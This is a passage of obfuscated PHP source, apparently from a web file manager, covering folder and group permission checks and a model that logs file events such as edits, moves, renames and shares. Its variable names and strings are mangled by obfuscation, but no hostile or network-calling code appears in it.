makeSourceAuth($¥´î½´ö, $‡¬ñªñá, $Èê­ÈœÀ = false) { $øÈŞ°‹¤ =& $_SERVER[ŒÅŸ‹ä†]; $ŠÁš† = $øÈŞ°‹¤[101]; $Ê´Õ–÷À = $¥´î½´ö[$øÈŞ°‹¤[594]]; $¤ç·Ş“ó = $¥´î½´ö[$øÈŞ°‹¤[199]] == SourceModel::TYPE_GROUP; $ßò›ñ–µ = $¤ç·Ş“ó ? $this->groupRootAuth($Ê´Õ–÷À, $Èê­ÈœÀ) : !1; if ($ßò›ñ–µ && Model($øÈŞ°‹¤[596])->authCheckAction($ßò›ñ–µ[$øÈŞ°‹¤[507]], $øÈŞ°‹¤[1509])) { return $this->groupAuthInfo($ßò›ñ–µ, $Ê´Õ–÷À); } $Ô¼ûÈ©¥ = Model($øÈŞ°‹¤[1477])->parentLevelArray($¥´î½´ö[$øÈŞ°‹¤[609]]); $Ô¼ûÈ©¥ = array_merge(array($¥´î½´ö[$øÈŞ°‹¤[202]]), array_reverse($Ô¼ûÈ©¥)); $£Äë°‹ = !1; foreach ($Ô¼ûÈ©¥ as $İúôüÕû) { if (!isset($‡¬ñªñá[$İúôüÕû])) { continue; } $ßâ´† = $this->authMake($‡¬ñªñá[$İúôüÕû], $Èê­ÈœÀ); if ($ßâ´†[$øÈŞ°‹¤[561]]) { $£Äë°‹ = $ßâ´†; break; } } if (!$¤ç·Ş“ó) { return $£Äë°‹; } if (!$£Äë°‹ && $ßò›ñ–µ) { $£Äë°‹ = $this->groupAuthInfo($ßò›ñ–µ, $Ê´Õ–÷À); } if (!$£Äë°‹) { $ÎÕ”§°Ñ = Model($øÈŞ°‹¤[610])->getInfo($Ê´Õ–÷À); $ÉÍá‹Şˆ = explode($øÈŞ°‹¤[60], trim($ÎÕ”§°Ñ[$øÈŞ°‹¤[609]], $øÈŞ°‹¤[60])); $ÉÍá‹Şˆ = array_reverse($ÉÍá‹Şˆ); foreach ($ÉÍá‹Şˆ as $öâ™©¤Ö) { if ($öâ™©¤Ö == $øÈŞ°‹¤[239] || $öâ™©¤Ö == $ŠÁš†) { continue; } $œúœ¨“Š = $this->groupRootAuth($öâ™©¤Ö, $Èê­ÈœÀ); if (!$œúœ¨“Š) { continue; } $£Äë°‹ = $this->groupAuthInfo($œúœ¨“Š, $öâ™©¤Ö); break; } } if (!$£Äë°‹ || $£Äë°‹[$øÈŞ°‹¤[508]] <= 0) { $Öù×Œ³… = $this->authDeepCheck($¥´î½´ö[$øÈŞ°‹¤[202]], $Èê­ÈœÀ); if ($Öù×Œ³…) { $£Äë°‹ = $Öù×Œ³…; } } return $£Äë°‹; } private function userIsRoot($÷Òºİ‡ = false) { $À²‰ØÀË =& $_SERVER[ŒÅŸ‹ä†]; if (!$÷Òºİ‡ && KodUser::isRoot()) { return !0; } $ö”ì°„ = Model($À²‰ØÀË[622])->getInfo($÷Òºİ‡); $Âş§½Ş¤ = Model($À²‰ØÀË[2315])->listData($ö”ì°„[$À²‰ØÀË[2316]]); if ($Âş§½Ş¤ && $Âş§½Ş¤[$À²‰ØÀË[600]][$À²‰ØÀË[2319]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ĞÕ©ßÓ¤) { $«ºèÖ›ö =& $_SERVER[ŒÅŸ‹ä†]; $·Şñ¬¨’ = Model($«ºèÖ›ö[1477]); $şŠÛÓ¾Í = $·Şñ¬¨’->sourceInfo($ĞÕ©ßÓ¤); if (!$şŠÛÓ¾Í) { return !1; } $·Şñ¬¨’->groupPathDisplay($şŠÛÓ¾Í); $´‘éó× = array($şŠÛÓ¾Í); $´‘éó× = $·Şñ¬¨’->_listAppendPath($´‘éó×, !1); $şŠÛÓ¾Í = $´‘éó×[0]; $èûê—¤ı = $şŠÛÓ¾Í[$«ºèÖ›ö[607]]; if (isset($şŠÛÓ¾Í[$«ºèÖ›ö[615]])) { $ö™…¦Ç´ = explode($«ºèÖ›ö[8], trim($şŠÛÓ¾Í[$«ºèÖ›ö[607]], $«ºèÖ›ö[8])); array_shift($ö™…¦Ç´); $èûê—¤ı = $şŠÛÓ¾Í[$«ºèÖ›ö[613]] . $«ºèÖ›ö[2339] . implode($«ºèÖ›ö[8], $ö™…¦Ç´); } return array($«ºèÖ›ö[42] => $şŠÛÓ¾Í[$«ºèÖ›ö[42]], $«ºèÖ›ö[202] => $şŠÛÓ¾Í[$«ºèÖ›ö[202]], $«ºèÖ›ö[97] => KodIO::make($şŠÛÓ¾Í[$«ºèÖ›ö[202]]), $«ºèÖ›ö[607] => $èûê—¤ı); } private function groupAuthInfo($Ôñòñ¸¿, $­À·ÆÔ‚) { $ÙÏŒ›¢ =& $_SERVER[ŒÅŸ‹ä†]; $¢³ı¡† = Model($ÙÏŒ›¢[610])->getInfo($­À·ÆÔ‚); return array($ÙÏŒ›¢[2340] => intval($Ôñòñ¸¿[$ÙÏŒ›¢[507]]), $ÙÏŒ›¢[2330] => $Ôñòñ¸¿, $ÙÏŒ›¢[2341] => LNG($ÙÏŒ›¢[2342]), $ÙÏŒ›¢[2336] => array($ÙÏŒ›¢[514] => $¢³ı¡†[$ÙÏŒ›¢[42]], $ÙÏŒ›¢[97] => KodIO::make($¢³ı¡†[$ÙÏŒ›¢[100]][$ÙÏŒ›¢[202]]), $ÙÏŒ›¢[2343] => $¢³ı¡†[$ÙÏŒ›¢[614]])); } protected function groupRootAuth($Ë˜ˆÃõÖ, $Î©®Å’ì = false) { $¸Ä‰•ƒï =& $_SERVER[ŒÅŸ‹ä†]; $Î©®Å’ì = $Î©®Å’ì ? $Î©®Å’ì : USER_ID; $¥Ç™ìÓ = $Î©®Å’ì . $¸Ä‰•ƒï[2344] . $Ë˜ˆÃõÖ; static $Ã³ûõ¤õ = array(); if (isset($Ã³ûõ¤õ[$¥Ç™ìÓ])) { return $Ã³ûõ¤õ[$¥Ç™ìÓ]; } $Å¾Ÿ¥ÖÕ = Model($¸Ä‰•ƒï[610])->getInfo($Ë˜ˆÃõÖ); $©ù¾Ø¼ƒ = $this->userGroupList($Î©®Å’ì); $¹é½Şî = isset($©ù¾Ø¼ƒ[$Ë˜ˆÃõÖ]) ? $©ù¾Ø¼ƒ[$Ë˜ˆÃõÖ][$¸Ä‰•ƒï[507]] : !1; if ($¹é½Şî && Model($¸Ä‰•ƒï[596])->authCheckAction($¹é½Şî[$¸Ä‰•ƒï[507]], $¸Ä‰•ƒï[1509])) { $Ã³ûõ¤õ[$¥Ç™ìÓ] = $¹é½Şî; return $¹é½Şî; } $İÈ¯…‡¬ = $this->sourceAuthSelect($Å¾Ÿ¥ÖÕ[$¸Ä‰•ƒï[100]][$¸Ä‰•ƒï[202]]); $öã»Ì±Õ = $İÈ¯…‡¬ ? $this->authMake($İÈ¯…‡¬, $Î©®Å’ì) : !1; $ç¶ğïñ· = $öã»Ì±Õ ? $öã»Ì±Õ[$¸Ä‰•ƒï[561]] : !1; $Ã³ûõ¤õ[$¥Ç™ìÓ] = $ç¶ğïñ· ? $ç¶ğïñ· : $¹é½Şî; return $Ã³ûõ¤õ[$¥Ç™ìÓ]; } public function authOwnerApply($áş×²á) { $‰œ®»‰ =& $_SERVER[ŒÅŸ‹ä†]; if (empty($áş×²á[$‰œ®»‰[507]]) || isset($áş×²á[$‰œ®»‰[1528]]) && $áş×²á[$‰œ®»‰[1528]]) { return $áş×²á; } if (AuthModel::authCheckRoot($áş×²á[$‰œ®»‰[507]][$‰œ®»‰[508]])) { return $áş×²á; } $ÚÄ¡¥Ê = Model($‰œ®»‰[1477])->parentLevelArray($áş×²á[$‰œ®»‰[609]]); $ÚÄ¡¥Ê = array_merge(array($áş×²á[$‰œ®»‰[202]]), array_reverse($ÚÄ¡¥Ê)); $Áà‚ò£İ = $this->sourceAuthSelect($ÚÄ¡¥Ê); $€öÃ¼Æ› = array(); $…Ÿš´Šã = array(); foreach ($Áà‚ò£İ as $º…ç“ó => $öóá³ğ) { $š’ïÜˆŞ = $this->authFolderOwnerUser($öóá³ğ); $€öÃ¼Æ›[$º…ç“ó] = $š’ïÜˆŞ; $…Ÿš´Šã = array_merge($…Ÿš´Šã, $š’ïÜˆŞ[$‰œ®»‰[690]]); if ($š’ïÜˆŞ[$‰œ®»‰[2345]]) { break; } } if (count($…Ÿš´Šã) == 0) { $…Ÿš´Šã = $this->authFolderOwnerGroup($áş×²á[$‰œ®»‰[594]]); } $…Ÿš´Šã = array_unique($…Ÿš´Šã); if (AuthModel::authCheckRoot($áş×²á[$‰œ®»‰[507]][$‰œ®»‰[508]])) { $…Ÿš´Šã[] = USER_ID; } $áş×²á[$‰œ®»‰[507]][$‰œ®»‰[2346]] = Model($‰œ®»‰[602])->userListInfo($…Ÿš´Šã); return $áş×²á; } private function authFolderOwnerGroup($ì¿‡Ç´¹) { $ÏæÙ›€‰ =& $_SERVER[ŒÅŸ‹ä†]; $±ÆÏóÈß = Model($ÏæÙ›€‰[2218])->where(array($ÏæÙ›€‰[1439] => $ì¿‡Ç´¹))->select(); $ßŞ­²î– = array(); if (!$±ÆÏóÈß) { return $ßŞ­²î–; } foreach ($±ÆÏóÈß as $³ÚöÕ¦á) { $À•˜¨»ş = $this->authInfo($³ÚöÕ¦á); if (AuthModel::authCheckRoot($À•˜¨»ş[$ÏæÙ›€‰[507]])) { $ßŞ­²î–[] = $³ÚöÕ¦á[$ÏæÙ›€‰[1537]]; } } return $ßŞ­²î–; } private function authFolderOwnerUser($‰ÕšÃãç) { $ú°­¼íŠ =& $_SERVER[ŒÅŸ‹ä†]; $Ê‡“üô© = array(); $’§œ—Êü = !1; foreach ($‰ÕšÃãç as $µ–Á¸ä™) { $µÄ¹à” = $this->authInfo($µ–Á¸ä™); if ($µ–Á¸ä™[$ú°­¼íŠ[594]] == $ú°­¼íŠ[239]) { $’§œ—Êü = !0; } if ($µ–Á¸ä™[$ú°­¼íŠ[199]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($µÄ¹à”[$ú°­¼íŠ[507]])) { $Ê‡“üô©[] = $µ–Á¸ä™[$ú°­¼íŠ[594]]; } } } return array($ú°­¼íŠ[690] => $Ê‡“üô©, $ú°­¼íŠ[2345] => $’§œ—Êü); } public function authMake($•ì¼ş¨, $ù¼éÆÖ = false) { $™€Ší±© =& $_SERVER[ŒÅŸ‹ä†]; $¨‰²å¹ = $this->authArrayCheck($•ì¼ş¨, $ù¼éÆÖ); if ($¨‰²å¹[$™€Ší±©[2326]]) { $¨‰²å¹[$™€Ší±©[2326]] = $this->sourceAuthInfo($¨‰²å¹[$™€Ší±©[2326]]); } return $¨‰²å¹; } public function authArrayCheck($é´õÑ¾È, $¹˜ Äø— = false) { $‘Ó» “Œ =& $_SERVER[ŒÅŸ‹ä†]; if (!$é´õÑ¾È) { return array($‘Ó» “Œ[508] => 0, $‘Ó» “Œ[561] => !1, $‘Ó» “Œ[2341] => $‘Ó» “Œ[12]); } $¹˜ Äø— = $¹˜ Äø— ? $¹˜ Äø— : USER_ID; $Î’šŠğ“ = 0; $¾¬Ú®›Ò = 0; $Ÿ ƒ¢¦È = 0; $Œ©ƒ÷şĞ = 0; $½§Í­¿’ = 0; $¤¼úŸ–¯ = 0; $ŠÖ±şóá = 0; $ª‘¯®î³ = 0; $•”Öˆã· = 1000; $¾Šä®¼½ = 0; $Úâ÷Œµğ = 0; $åô§èúİ = 0; $Ÿ™¢Äæ = 0; $¢Ëôì¥Ó = 0; foreach ($é´õÑ¾È as $Ğ…»Úë) { $»µÛ¨€° = $this->authInfo($Ğ…»Úë); if (!$»µÛ¨€°) { continue; } $½š¬Ğ–ñ = $Ğ…»Úë[$‘Ó» “Œ[594]]; $è«ÅÍê = $Ğ…»Úë[$‘Ó» “Œ[202]]; $´³íì± = intval($»µÛ¨€°[$‘Ó» “Œ[507]]); if ($Ğ…»Úë[$‘Ó» “Œ[199]] == SourceModel::TYPE_USER && $½š¬Ğ–ñ == $¹˜ Äø—) { $Î’šŠğ“ = !0; $Ÿ ƒ¢¦È = $»µÛ¨€°; $¾¬Ú®›Ò = $´³íì±; $Œ©ƒ÷şĞ = $è«ÅÍê; } else { if ($Ğ…»Úë[$‘Ó» “Œ[199]] == SourceModel::TYPE_GROUP && $this->groupContainUser($½š¬Ğ–ñ, $¹˜ Äø—)) { $½§Í­¿’ = !0; $œô¿ØŸÀ = $this->groupStepToUserGroup($½š¬Ğ–ñ, $¹˜ Äø—); if ($œô¿ØŸÀ < $•”Öˆã·) { $•”Öˆã· = $œô¿ØŸÀ; $¤¼úŸ–¯ = $´³íì±; $ŠÖ±şóá = $»µÛ¨€°; $¾Šä®¼½ = $½š¬Ğ–ñ; $ª‘¯®î³ = $è«ÅÍê; } if ($œô¿ØŸÀ == $•”Öˆã· && $´³íì± >= $¤¼úŸ–¯) { $¤¼úŸ–¯ = $´³íì±; $ŠÖ±şóá = $»µÛ¨€°; $¾Šä®¼½ = $½š¬Ğ–ñ; $ª‘¯®î³ = $è«ÅÍê; } } else { if (!$½š¬Ğ–ñ || $½š¬Ğ–ñ == $‘Ó» “Œ[239]) { $Úâ÷Œµğ = !0; $Ÿ™¢Äæ = $»µÛ¨€°; $åô§èúİ = $´³íì±; $¢Ëôì¥Ó = $è«ÅÍê; } } } } if ($Î’šŠğ“) { $Èüƒ¥†Å = $¾¬Ú®›Ò; $»µÛ¨€° = $Ÿ ƒ¢¦È; $š”å¥ù± = $Œ©ƒ÷şĞ; $àè·º•ğ = LNG($‘Ó» “Œ[2347]); } else { if ($½§Í­¿’) { $Èüƒ¥†Å = $¤¼úŸ–¯; $»µÛ¨€° = $ŠÖ±şóá; $š”å¥ù± = $ª‘¯®î³; $“›Ü¶­Ä = Model($‘Ó» “Œ[610])->getInfo($¾Šä®¼½); $àè·º•ğ = $‘Ó» “Œ[184] . $“›Ü¶­Ä[$‘Ó» “Œ[614]] . $‘Ó» “Œ[2348] . LNG($‘Ó» “Œ[2349]); } else { if ($Úâ÷Œµğ) { $Èüƒ¥†Å = $åô§èúİ; $»µÛ¨€° = $Ÿ™¢Äæ; $š”å¥ù± = $¢Ëôì¥Ó; $àè·º•ğ = LNG($‘Ó» “Œ[2328]); } else { $Èüƒ¥†Å = 0; $»µÛ¨€° = !1; $àè·º•ğ = $‘Ó» “Œ[12]; $š”å¥ù± = $‘Ó» “Œ[12]; } } } $ä¼±¾…× = array($‘Ó» “Œ[2340] => intval($Èüƒ¥†Å), $‘Ó» “Œ[2330] => $»µÛ¨€°, $‘Ó» “Œ[2341] => $àè·º•ğ, $‘Ó» “Œ[2336] => $š”å¥ù±); return $ä¼±¾…×; } private function groupContainUser($ÊÂë“Æá, $—İ”“Á = false) { return in_array($ÊÂë“Æá, $this->userGroupParents($—İ”“Á)); } private function groupStepToUserGroup($¡ªƒ®”Ë, $úîú«çê = false) { $Î•°¹» =& $_SERVER[ŒÅŸ‹ä†]; $Â³•–”µ = $this->userGroupList($úîú«çê); $…ñÎ¶™ = 1000; $ş¸ìèêÇ = $GLOBALS[$Î•°¹»[6]][$Î•°¹»[102]][$Î•°¹»[2231]] == 1; $¸¾ôµ¼© = $ş¸ìèêÇ ? 3 : 2; foreach ($Â³•–”µ as $±Õ²Ş¸Ô) { if ($±Õ²Ş¸Ô[$Î•°¹»[1439]] == $¡ªƒ®”Ë) { return 0; } $§Àı¯ÃÂ = explode($Î•°¹»[60], trim($±Õ²Ş¸Ô[$Î•°¹»[609]], $Î•°¹»[60])); if ($§Àı¯ÃÂ[0] == $Î•°¹»[239] && count($§Àı¯ÃÂ) > $¸¾ôµ¼©) { $ªÂÕ­ = array_reverse(array_slice($§Àı¯ÃÂ, $¸¾ôµ¼©)); $ù–ã—çÎ = array_search($¡ªƒ®”Ë, $ªÂÕ­); if ($ù–ã—çÎ !== !1 && $ù–ã—çÎ + 1 <= $…ñÎ¶™) { $…ñÎ¶™ = $ù–ã—çÎ + 1; } } } return $…ñÎ¶™; } private function userGroupList($ó‰”°Ç = false, $ò§ñÌÂ = false) { $ŞòˆÀ§ß =& $_SERVER[ŒÅŸ‹ä†]; static $“Å™ïóï = array(); if (isset($“Å™ïóï[$ó‰”°Ç])) { return $“Å™ïóï[$ó‰”°Ç]; } if (!$ò§ñÌÂ) { $ò§ñÌÂ = Model($ŞòˆÀ§ß[622])->getInfo($ó‰”°Ç); } $“Å™ïóï[$ó‰”°Ç] = array_to_keyvalue($ò§ñÌÂ[$ŞòˆÀ§ß[1438]], $ŞòˆÀ§ß[1439]); return $“Å™ïóï[$ó‰”°Ç]; } public function userGroupParents($´›çˆ) { $ê±ìë„ê =& $_SERVER[ŒÅŸ‹ä†]; static $À®ÍğÂ = array(); $´›çˆ = $´›çˆ ? $´›çˆ : USER_ID; if (isset($À®ÍğÂ[$´›çˆ])) { return $À®ÍğÂ[$´›çˆ]; } $¼½®›ú = $this->userGroupList($´›çˆ); $š¾÷…î» = array(); $ îî²ë³ = $GLOBALS[$ê±ìë„ê[6]][$ê±ìë„ê[102]][$ê±ìë„ê[2231]] == 1; $¼Ã©€Â‚ = $ îî²ë³ ? 3 : 2; foreach ($¼½®›ú as $õŒ„ÑÍç) { $êôù‘  = array($õŒ„ÑÍç[$ê±ìë„ê[1439]]); $Šù­ÛºÊ = explode($ê±ìë„ê[60], trim($õŒ„ÑÍç[$ê±ìë„ê[609]], $ê±ìë„ê[60])); if ($Šù­ÛºÊ[0] == $ê±ìë„ê[239] && count($Šù­ÛºÊ) > $¼Ã©€Â‚) { $¯¦¥›Ù¨ = array_slice($Šù­ÛºÊ, $¼Ã©€Â‚); $êôù‘  = array_merge($êôù‘ , array_reverse($¯¦¥›Ù¨)); } $š¾÷…î» = array_merge($š¾÷…î», $êôù‘ ); } $À®ÍğÂ[$´›çˆ] = array_unique($š¾÷…î»); return $À®ÍğÂ[$´›çˆ]; } public function authTargetInfoMake($ÆÁºÚöÏ) { $ééàÈ³â =& $_SERVER[ŒÅŸ‹ä†]; $˜¾Ğ·é¼ = array(); $ˆ ÉÈä = array(); foreach ($ÆÁºÚöÏ as $ˆµÈ¿Ä›) { if ($ˆµÈ¿Ä›[$ééàÈ³â[199]] == SourceModel::TYPE_USER) { $˜¾Ğ·é¼[] = intval($ˆµÈ¿Ä›[$ééàÈ³â[594]]); } else { if ($ˆµÈ¿Ä›[$ééàÈ³â[199]] == SourceModel::TYPE_GROUP) { $ˆ ÉÈä[] = intval($ˆµÈ¿Ä›[$ééàÈ³â[594]]); } } } if ($˜¾Ğ·é¼) { $˜¾Ğ·é¼ = Model($ééàÈ³â[602])->userListInfo($˜¾Ğ·é¼); } if ($ˆ ÉÈä) { $Ä¤Æ½™™ = array($ééàÈ³â[2211] => array($ééàÈ³â[512], $ˆ ÉÈä)); $ˆ ÉÈä = Model($ééàÈ³â[610])->field($ééàÈ³â[2350])->where($Ä¤Æ½™™)->select(); $ˆ ÉÈä = array_to_keyvalue($ˆ ÉÈä, $ééàÈ³â[1439]); } return array($ééàÈ³â[2351] => $˜¾Ğ·é¼, $ééàÈ³â[2352] => $ˆ ÉÈä); } public function authInfo($À§¿ƒõÛ) { $å©ÚÛâ =& $_SERVER[ŒÅŸ‹ä†]; if ($À§¿ƒõÛ[$å©ÚÛâ[1584]]) { $©ëüÃô… = Model($å©ÚÛâ[596])->listData($À§¿ƒõÛ[$å©ÚÛâ[1584]]); if (!$©ëüÃô…) { return !1; $ñÌùìû„ = Model($å©ÚÛâ[596])->listData(); $öóÅ÷ñ÷ = array_filter_by_field($ñÌùìû„, $å©ÚÛâ[507], $å©ÚÛâ[239]); return $öóÅ÷ñ÷; } $¢­Á’íÆ = array_field_key($©ëüÃô…, array($å©ÚÛâ[492], $å©ÚÛâ[42], $å©ÚÛâ[507], $å©ÚÛâ[2147], $å©ÚÛâ[2148])); $¢­Á’íÆ[$å©ÚÛâ[2353]] = $À§¿ƒõÛ; return $¢­Á’íÆ; } else { return array($å©ÚÛâ[513] => 0, $å©ÚÛâ[2132] => $À§¿ƒõÛ[$å©ÚÛâ[2288]], $å©ÚÛâ[514] => $å©ÚÛâ[12], $å©ÚÛâ[2147] => $å©ÚÛâ[2354]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\165\162\143\x65\137\145\x76\x65\x6e\x74"; protected $dataAuto = array(array("\x63\162\145\141\164\145\124\x69\155\x65", "\164\x69\x6d\145", "\x69\x6e\163\x65\x72\x74", "\146\165\156\x63\x74\151\x6f\x6e"), array("\144\x65\163\x63", '', "\x69\156\163\x65\x72\164\x2c\x75\160\144\x61\x74\145\x2c\163\x65\154\145\x63\x74", "\152\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ÊŠàÊˆÚ, $„øºÍ¬è, $Å±¸Âã¸ = '') { $ÁÄÛ·»³ =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->eventSave) { return; } $›å¾Ù¿ = Model($ÁÄÛ·»³[1477])->sourceInfo($ÊŠàÊˆÚ); if (!$›å¾Ù¿) { return !1; } if ($this->isDisableEvent($›å¾Ù¿, $„øºÍ¬è)) { return; } if ($Å±¸Âã¸ && is_string($Å±¸Âã¸)) { $Å±¸Âã¸ = array($ÁÄÛ·»³[2164] => $Å±¸Âã¸); } $ÉìÙï‰À = KodUser::id(); $Áš‹°´š = array($ÁÄÛ·»³[511] => $ÊŠàÊˆÚ, $ÁÄÛ·»³[2355] => $›å¾Ù¿[$ÁÄÛ·»³[201]], $ÁÄÛ·»³[2356] => $›å¾Ù¿[$ÁÄÛ·»³[42]], $ÁÄÛ·»³[607] => !empty($›å¾Ù¿[$ÁÄÛ·»³[607]]) ? $›å¾Ù¿[$ÁÄÛ·»³[607]] : $ÁÄÛ·»³[12], $ÁÄÛ·»³[1911] => $ÉìÙï‰À, $ÁÄÛ·»³[516] => $„øºÍ¬è, $ÁÄÛ·»³[1913] => $Å±¸Âã¸); $this->addSystemLog($„øºÍ¬è, $Áš‹°´š); unset($Áš‹°´š[$ÁÄÛ·»³[2356]], $Áš‹°´š[$ÁÄÛ·»³[607]]); return $this->add($Áš‹°´š); } private function addSystemLog($î¢•½—±, $ô§ÛÕ) { $¼Åâ¼À¤ =& $_SERVER[ŒÅŸ‹ä†]; if ($î¢•½—± == $¼Åâ¼À¤[2357]) { $î¢•½—± = $ô§ÛÕ[$¼Åâ¼À¤[545]][$¼Åâ¼À¤[2358]]; } else { if (in_array($î¢•½—±, array($¼Åâ¼À¤[1507], $¼Åâ¼À¤[2359]))) { $î¢•½—± = $ô§ÛÕ[$¼Åâ¼À¤[545]][$¼Åâ¼À¤[179]]; } } $”¤ÆŞÓŞ = array_merge($ô§ÛÕ, array($¼Åâ¼À¤[2360] => $ô§ÛÕ[$¼Åâ¼À¤[202]], $¼Åâ¼À¤[2361] => $ô§ÛÕ[$¼Åâ¼À¤[2361]])); Hook::trigger($¼Åâ¼À¤[2362], $¼Åâ¼À¤[2363] . $î¢•½—±, $ô§ÛÕ); Model($¼Åâ¼À¤[2073])->addLog($¼Åâ¼À¤[2363] . $î¢•½—±, $”¤ÆŞÓŞ); } private function isDisableEvent($Ú§İÔÒî, $­õ‰ë˜‘) { $ •ƒ˜å =& $_SERVER[ŒÅŸ‹ä†]; if ($Ú§İÔÒî[$ •ƒ˜å[199]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($­õ‰ë˜‘ == $ •ƒ˜å[1275]) { return !1; } return !0; } public function eventCreate($îïñÕ‚, $åËİÈğİ) { $Š÷¡ÆıÁ =& $_SERVER[ŒÅŸ‹ä†]; $‚ìÄØû¯ = Model($Š÷¡ÆıÁ[1477])->sourceInfo($îïñÕ‚); $³©¨ÜŠµ = array($Š÷¡ÆıÁ[2358] => $åËİÈğİ, $Š÷¡ÆıÁ[42] => $‚ìÄØû¯[$Š÷¡ÆıÁ[42]]); return $this->addEvent($îïñÕ‚, $Š÷¡ÆıÁ[2357], $³©¨ÜŠµ); } public function eventFileEdit($åä€›Öô) { $œ¦³¶É— =& $_SERVER[ŒÅŸ‹ä†]; $Ü¹Øµóò = array($œ¦³¶É—[2364] => $_SERVER[$œ¦³¶É—[2365]], $œ¦³¶É—[2366] => strtolower(ACTION)); if (isset($GLOBALS[$œ¦³¶É—[7]][$œ¦³¶É—[1567]])) { $Ü¹Øµóò[$œ¦³¶É—[1567]] = $œ¦³¶É—[101]; } return $this->addEvent($åä€›Öô, $œ¦³¶É—[1506], $Ü¹Øµóò); } public function eventRecycle($óó¯«Œò, $ö—ë´‡) { return $this->addEvent($óó¯«Œò, $_SERVER[ŒÅŸ‹ä†][2359], $ö—ë´‡); } private static $_removeLast = ''; public function eventRemove($·²†Å°) { $¤ä‡Ìß‘ =& $_SERVER[ŒÅŸ‹ä†]; self::$_removeLast = $·²†Å°; $¯÷¥É£± = Model($¤ä‡Ìß‘[1477])->sourceInfo($·²†Å°); $ÉÑ•¬ì” = array_field_key($¯÷¥É£±, array($¤ä‡Ìß‘[202], $¤ä‡Ìß‘[562], $¤ä‡Ìß‘[525], $¤ä‡Ìß‘[609])); $Â’ÚÉìğ = array($¤ä‡Ìß‘[179] => $¯÷¥É£±[$¤ä‡Ìß‘[42]], $¤ä‡Ìß‘[2366] => ACTION, $¤ä‡Ìß‘[2367] => $ÉÑ•¬ì”); return $this->addEvent($¯÷¥É£±[$¤ä‡Ìß‘[201]], $¤ä‡Ìß‘[1275], $Â’ÚÉìğ); } public function eventShare($¨‚ÃˆèÃ, $ìÂöòâõ) { return $this->addEvent($¨‚ÃˆèÃ, $_SERVER[ŒÅŸ‹ä†][1507], $ìÂöòâõ); } public function eventMove($İ½¦¨Ö•, $àŞµğ±Ü, $ë¢ı´µ’) { $›ïÓ­Ñ =& $_SERVER[ŒÅŸ‹ä†]; if (self::$_removeLast == $İ½¦¨Ö•) { return; } $ßéè¡½ã = Model($›ïÓ­Ñ[1477]); $‹–áÆÀı = $ßéè¡½ã->sourceInfo($İ½¦¨Ö•); $¦ˆ¹¹ˆ… = $ßéè¡½ã->sourceInfo($àŞµğ±Ü); $™Âì œ = $ßéè¡½ã->sourceInfo($ë¢ı´µ’); $ƒ˜éÃÍÈ = array($›ïÓ­Ñ[1287] => $àŞµğ±Ü, $›ïÓ­Ñ[2368] => $¦ˆ¹¹ˆ…[$›ïÓ­Ñ[42]], $›ïÓ­Ñ[2326] => !empty($¦ˆ¹¹ˆ…[$›ïÓ­Ñ[607]]) ? $¦ˆ¹¹ˆ…[$›ïÓ­Ñ[607]] : $›ïÓ­Ñ[12], $›ïÓ­Ñ[1288] => $ë¢ı´µ’, $›ïÓ­Ñ[2369] => $™Âì œ[$›ïÓ­Ñ[42]], $›ïÓ­Ñ[2370] => !empty($™Âì œ[$›ïÓ­Ñ[607]]) ? $™Âì œ[$›ïÓ­Ñ[607]] : $›ïÓ­Ñ[12]); $this->addEvent($İ½¦¨Ö•, $›ïÓ­Ñ[648], $ƒ˜éÃÍÈ); $‹–áÆÀı = $ßéè¡½ã->sourceInfo($İ½¦¨Ö•); $ƒ˜éÃÍÈ = array($›ïÓ­Ñ[202] => $‹–áÆÀı[$›ïÓ­Ñ[202]], $›ïÓ­Ñ[42] => $‹–áÆÀı[$›ïÓ­Ñ[42]]); $this->addEvent($àŞµğ±Ü, $›ïÓ­Ñ[2371], $ƒ˜éÃÍÈ); } public function eventCopy($„‰—óª) { $this->eventCreate($„‰—óª, $_SERVER[ŒÅŸ‹ä†][646]); } public function eventRename($­Û‡üªØ, $êƒç°§ô, $Šùí¨ÔÔ) { $´Œò·òİ =& $_SERVER[ŒÅŸ‹ä†]; $·•ËâĞ— = array($´Œò·òİ[1287] => $êƒç°§ô, $´Œò·òİ[1288] => $Šùí¨ÔÔ); return $this->addEvent($­Û‡üªØ, $´Œò·òİ[1491], $·•ËâĞ—); } public function eventAddComment($­Ÿ»•ìŞ, $à¦‹˜¸Ñ) { return $this->addEvent($­Ÿ»•ìŞ, $_SERVER[ŒÅŸ‹ä†][2372], $à¦‹˜¸Ñ); } public function eventAddDesc($Ì”®ó, $¾¥ˆêÉú) { return $this->addEvent($Ì”®ó, $_SERVER[ŒÅŸ‹ä†][2373], $¾¥ˆêÉú); } public function listBySource($Óş´Ë—Â) { $¹®âñ¢ =& $_SERVER[ŒÅŸ‹ä†]; $×áı¸ƒ = Model($¹®âñ¢[1477])->sourceInfo($Óş´Ë—Â); $ö¦§ËşÇ = array($¹®âñ¢[511] => $Óş´Ë—Â); if ($×áı¸ƒ[$¹®âñ¢[505]] == $¹®âñ¢[101]) { $ÔßŞü“ = Model($¹®âñ¢[1477])->listSearchChildren($Óş´Ë—Â, 20000); $ÔßŞü“[] = $Óş´Ë—Â . $¹®âñ¢[472]; $ö¦§ËşÇ = array($¹®âñ¢[202] => array($¹®âñ¢[7], $ÔßŞü“)); } $•™ğ­‡ = $this->where($ö¦§ËşÇ)->order($¹®âñ¢[2374])->selectPage(); if ($•™ğ­‡[$¹®âñ¢[452]][$¹®âñ¢[453]] == 0) { $•™ğ­‡[$¹®âñ¢[452]][$¹®âñ¢[453]] = 1; $•™ğ­‡[$¹®âñ¢[455]] = array(array($¹®âñ¢[511] => $Óş´Ë—Â, $¹®âñ¢[2355] => $×áı¸ƒ[$¹®âñ¢[201]], $¹®âñ¢[1911] => $×áı¸ƒ[$¹®âñ¢[546]], $¹®âñ¢[516] => $¹®âñ¢[2375], $¹®âñ¢[517] => $×áı¸ƒ[$¹®âñ¢[242]], $¹®âñ¢[1913] => $¹®âñ¢[12])); } return $this->eventListParse($•™ğ­‡, $Óş´Ë—Â); } private function eventListParse($ ÚÄïÖŞ, $ßÜ—Ïãó) { $‰¬‡¹í =& $_SERVER[ŒÅŸ‹ä†]; $ò¶Ş¯²³ = $ 